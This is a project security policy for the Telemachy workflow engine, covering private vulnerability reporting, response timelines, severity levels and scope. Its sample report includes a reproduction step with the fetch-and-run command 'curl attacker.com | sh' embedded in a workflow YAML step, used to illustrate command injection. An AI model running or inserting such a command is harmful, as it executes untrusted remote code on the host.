# Security Policy

## Reporting Security Vulnerabilities

**Do not open public issues for security vulnerabilities.**

We take security seriously. If you discover a security vulnerability, please report it responsibly.

## How to Report

### Email (Preferred)

Send an email to: **<4211002+mvillmow@users.noreply.github.com>**

Or use the GitHub private vulnerability reporting feature if available.

### What to Include

Please include as much of the following information as possible:

- **Description** - Clear description of the vulnerability
- **Impact** - Potential impact and severity assessment
- **Steps to reproduce** - Detailed steps to reproduce the issue
- **Affected files** - Which source files, workflows, or configurations are affected
- **Suggested fix** - If you have a suggested fix or mitigation

### Example Report

```text
Subject: [SECURITY] Workflow YAML parser allows arbitrary command execution

Description:
The workflow YAML parser does not restrict the "command" field in step
definitions, allowing a workflow to execute arbitrary shell commands
on the host running the Telemachy engine.

Impact:
A malicious workflow definition could execute arbitrary commands with
the privileges of the Telemachy process.

Steps to Reproduce:
1. Create a workflow YAML with step: command: "curl attacker.com | sh"
2. Run: just run malicious-workflow
3. Observe arbitrary command execution

Affected Files:
src/telemachy/executor.py (step execution logic)

Suggested Fix:
Restrict allowed commands to a configurable allowlist or sandbox execution.
```

## Response Timeline

We aim to respond to security reports within the following timeframes:

| Stage                    | Timeframe              |
|--------------------------|------------------------|
| Initial acknowledgment   | 48 hours               |
| Preliminary assessment   | 1 week                 |
| Fix development          | Varies by severity     |
| Public disclosure        | After fix is released  |

## Severity Assessment

We use the following severity levels:

| Severity     | Description                          | Response           |
|--------------|--------------------------------------|--------------------|
| **Critical** | Remote code execution, data breach   | Immediate priority |
| **High**     | Privilege escalation, data exposure  | High priority      |
| **Medium**   | Limited impact vulnerabilities       | Standard priority  |
| **Low**      | Minor issues, hardening              | Scheduled fix      |

## Responsible Disclosure

We follow responsible disclosure practices:

1. **Report privately** - Do not disclose publicly until a fix is available
2. **Allow reasonable time** - Give us time to investigate and develop a fix
3. **Coordinate disclosure** - We will work with you on disclosure timing
4. **Credit** - We will credit you in the security advisory (if desired)

## What We Will Do

When you report a vulnerability:

1. Acknowledge receipt within 48 hours
2. Investigate and validate the report
3. Develop and test a fix
4. Release the fix
5. Publish a security advisory

## Scope

### In Scope

- Python workflow engine source code (`src/telemachy/`)
- Workflow YAML definitions (`workflows/`)
- Agamemnon and NATS integration logic
- Justfile recipes

### Out of Scope

- ProjectAgamemnon API (report to [ProjectAgamemnon](https://github.com/HomericIntelligence/ProjectAgamemnon))
- NATS server (report to [nats-io](https://github.com/nats-io))
- Other HomericIntelligence submodule repos (report to that repo directly)
- Social engineering attacks
- Physical security

## Security Best Practices

When contributing to ProjectTelemachy:

- Validate workflow YAML schemas before execution
- Sanitize workflow parameters and step inputs
- Never embed credentials in workflow definitions — use environment variables
- Use environment variables for NATS and Agamemnon connection details
- Restrict executable commands in workflow steps

## Contact

For security-related questions that are not vulnerability reports:

- Open a GitHub Discussion with the "security" tag
- Email: <4211002+mvillmow@users.noreply.github.com>

---

Thank you for helping keep HomericIntelligence secure!
